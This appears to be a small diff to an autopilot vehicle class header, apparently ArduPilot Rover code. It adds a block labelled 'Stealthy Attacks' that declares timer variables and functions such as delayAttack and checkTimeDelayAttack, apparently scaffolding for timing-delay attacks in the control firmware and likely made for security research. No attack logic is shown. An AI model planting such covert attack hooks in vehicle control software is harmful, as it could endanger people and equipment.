@@ -489,6 +489,19 @@ public:
 
     // sailboat enabled
     bool get_sailboat_enable() { return g2.sailboat.enabled(); }
+
+    /*
+     * Stealthy Attacks
+     */
+    clock_t tStart;
+    clock_t tEnd;
+    clock_t wait;
+    clock_t timeNow;
+    int check = 0;
+    int checkTimeDelayAttack();
+    void startTimer();
+    int delayAttack(int s);
+    bool initTimer;
 };
 
 extern const AP_HAL::HAL& hal;
